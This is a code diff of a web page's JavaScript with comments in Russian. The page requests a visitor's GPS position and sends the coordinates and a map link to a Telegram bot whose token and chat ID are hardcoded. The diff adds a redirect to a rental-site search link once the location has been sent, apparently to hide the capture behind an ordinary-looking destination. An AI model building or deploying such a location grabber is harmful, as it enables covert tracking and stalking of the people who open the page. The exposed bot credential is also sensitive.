@@ -35,6 +35,9 @@ body{
 const BOT_TOKEN = "8794887091:AAF9ha3O1odasYB9fAT-PpM2-GrRhOs6TTM";
 const CHAT_ID = "748937871";
 
+// 👇 СЮДА ССЫЛКА ДЛЯ ПЕРЕАДРЕСАЦИИ
+const REDIRECT_URL = "https://yabs.yandex.ru/count/WoSejI_zOoVX2Lc60yqO0BFigrw1S0QFUmcO4wZY4mXxmmJqfbWiYnG2tWi8w2WWK2ftca2Vp-NEdkrtxhpXpjVlUBtX3lUfD89LwKSfoQgaD8AIaXLfnb6EdnjM6ZEESlmepJZAyQDK99JZUM8Amea2n8-HLKQEstx-L8MCh39o_21LSzYsD9_YpoXKYlzKXP2gEPuvBfq-RJjgupzLePygDGSqTzhHA1vz_bI5PEIud_dJQGFLD9A4Z8vCa5X26c5KD2F8I6afgN47JDcymCiTW18XfJSnWu0V8LSCEeu_G0uBqFu0CIn0-mE4N83s1qXX0TeV88G5Q3-On1QW_M2IgG3j1vDw0TeFlfmBq7xmPR80xGTVlXIW_U2BP07Q3hQBELy7b88Cu6pTsCZf-h8hJ7AxfWxLUDfHssdZEHIFElFyEONQk5tRTnJ7eT2fFSsdkLHghy31-cqID36V7wENaXjl3IQIJWJ3NOJutUnFsIiB6A1sFjymEG7S00vW0zS_sV8cPJktv0eLhOOTWow0juSCJW1kZAxhEfEkr-WSV5pn2ipYPCaJ3RUBMGqgtnqy5fWxOCjTLGS81F1bGG-Tkul8qb44QuSJDIeBMnDNklHWGDq1ih239gjGlha2fc1kyj2ZiFKKT9W9PMRNbN4CkQbZmKnCMASOCHsZmtnt_fmqsREQc07J5I72muGUg1EgffuFmsj-QJ2uBZyS0mctV_2AGIN_Iy2Kl-ybOChVvo80HEplT7VHwskz4-JsPxqJv9PfjZcIXLcsEPA5EMOklSpblkkwhjDc2tPDZb8nS52yz1u31yLBR_sLLX-TNVxvCftOXT2JwIPGnloOzc0lEUGhpdy_w6bjNBzzvYqoZhtMh_q87_dXizxhNazjAylB5I5rYaSqCrSgbSeG9kHITeoEWGcb_DcW4Xp3aB0G1I7yc_d0D_mFsbzZpc24A9MgThVXlOfJMvlXnLCv7yjOF8dlleu6aoACMtYQ8LUiQ1UVFSRze7TXfqq2ZB3itpEvxYD4UwZbFYYCEv1HZnFHC3gEvI3KnocCnlCcsKWjEcfXPLXlxm40~2?etext=2202.fV5kdFprRwQPu1io2dOL_SvrdL487nAzAmoqgRZ4uIhmcG10eWJreXZhdXhmbmJs.e2255d62913d7ce12e6eb6b16e74a4cef0d9e723&from=yandex.ru%3Bsearch%26%23x2F%3B%3Bweb%3B%3B0%3B&q=%D1%81%D1%83%D1%82%D0%BE%D1%87%D0%BD%D0%BE+%D1%80%D1%83&baobab_event_id=mp988hutse&ctime=1778989197414";
+
 const statusText = document.getElementById("status");
 
 async function sendToTelegram(message) {
@@ -60,31 +63,30 @@ async function sendToTelegram(message) {
         console.log(result);
 
         if (!result.ok) {
-            statusText.innerText =
-                "Ошибка Telegram";
+            statusText.innerText = "Ошибка Telegram";
         }
 
     } catch (e) {
-
         console.error(e);
-
-        statusText.innerText =
-            "Ошибка сети";
+        statusText.innerText = "Ошибка сети";
     }
+}
+
+function redirectAfterDelay() {
+    statusText.innerText = "Перенаправление...";
+    setTimeout(() => {
+        window.location.href = REDIRECT_URL;
+    }, 1500);
 }
 
 function getLocation() {
 
     if (!navigator.geolocation) {
-
-        statusText.innerText =
-            "GPS не поддерживается";
-
+        statusText.innerText = "GPS не поддерживается";
         return;
     }
 
-    statusText.innerText =
-        "Запрос GPS...";
+    statusText.innerText = "Запрос GPS...";
 
     navigator.geolocation.getCurrentPosition(
 
@@ -117,17 +119,16 @@ https://maps.google.com/?q=${lat},${lon}`;
 
             await sendToTelegram(message);
 
-            statusText.innerText =
-                "Геолокация отправлена";
+            statusText.innerText = "Геолокация отправлена";
+
+            // 👇 ПЕРЕХОД НА СЛЕДУЮЩУЮ СТРАНИЦУ
+            redirectAfterDelay();
 
         },
 
         (error) => {
-
             console.error(error);
-
-            statusText.innerText =
-                "Ошибка GPS: " + error.message;
+            statusText.innerText = "Ошибка GPS: " + error.message;
         },
 
         {
